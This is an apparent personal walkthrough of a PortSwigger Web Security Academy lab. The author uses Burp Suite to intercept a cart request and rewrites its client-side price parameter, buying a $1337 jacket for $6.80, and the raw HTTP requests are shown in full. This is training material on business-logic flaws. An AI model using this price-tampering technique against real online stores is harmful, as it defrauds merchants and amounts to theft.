This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket.

The lab says I can log in to my own account using the following credentials: `wiener:peter`

The jacket they asked us to buy is $1337, but we only have $100.

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FTdazfM8mKd62sM9sDNdp%2Fuploads%2Ft8FEkZXtvmgKnR5NkKPR%2FScreenshot%202023-12-17%20at%205.37.47%20PM.png?alt=media&token=dcf3808a-81a1-4c96-87e8-d93dbe216773)

I'll place the item in my cart, place the order to see the result first.

```
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2
Host: 0a48002b043008a1864f99f000c9002d.web-security-academy.net
Cookie: session=2OV62Y55xhB5K582mDaIpDIrjWHT1iZi
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a48002b043008a1864f99f000c9002d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

There is a error message that lets us know there is insufficient funds. In order to manipulate this, we have to see what result we get when we buy something within $100.

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FTdazfM8mKd62sM9sDNdp%2Fuploads%2Fehd4tD1G3mF1fGm30fHy%2FScreenshot%202023-12-17%20at%205.45.33%20PM.png?alt=media&token=633c0ed3-7a70-4495-b919-ee6ee2d445d6)

I'll turn on Burp Proxy, place the order and intercept the request:

```
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a48002b043008a1864f99f000c9002d.web-security-academy.net
Cookie: session=2OV62Y55xhB5K582mDaIpDIrjWHT1iZi
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a48002b043008a1864f99f000c9002d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

We see from the request header there is `/order-confirmation?order-confirmed=true .`

Is there a way we can possibly paste this into the request for when we order the jacket? Let's try it.

```
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a48002b043008a1864f99f000c9002d.web-security-academy.net
Cookie: session=2OV62Y55xhB5K582mDaIpDIrjWHT1iZi
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a48002b043008a1864f99f000c9002d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

Let's send this modified request via Burp Repeater to see if it works!

```
HTTP/2 405 Method Not Allowed
Allow: GET
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

​

"Method Not Allowed"
```

Whoops. Maybe I went too far ahead. Let's try manipulating the data earlier on.

Going back to the lab description, it says we can buy items for an unintended price. This indicates to me that I can somehow manipulate the price when intercepting a request.

The request made when checking out does not show any way to do this, so let's try this earlier when we add the item to the cart.

```
POST /cart HTTP/2
Host: 0a48002b043008a1864f99f000c9002d.web-security-academy.net
Cookie: session=2OV62Y55xhB5K582mDaIpDIrjWHT1iZi
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: https://0a48002b043008a1864f99f000c9002d.web-security-academy.net
Referer: https://0a48002b043008a1864f99f000c9002d.web-security-academy.net/product?productId=5
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

productId=5&redir=PRODUCT&quantity=1&price=680
```

​



We see that from adding the cheaper item to our cart, we get the following at the body:

`productId=5&redir=PRODUCT&quantity=1&price=680`

Let's try intercepting the request to add the jacket to the cart:

`productId=1&redir=PRODUCT&quantity=1&price=133700`

This was found in its body. Let me change the price to that of the cheaper item:

`productId=1&redir=PRODUCT&quantity=1&price=680`

Let's try and forward this modified request:
![[Pasted image 20240509135839.png]]
As you can see, the price of the jacket has been successfully changed. Let's complete the purchase.
![[Pasted image 20240509135907.png]]
Nice!
Really learnt how there is logic flaws when it comes to validating inputs, and important vector I will take note of in the future!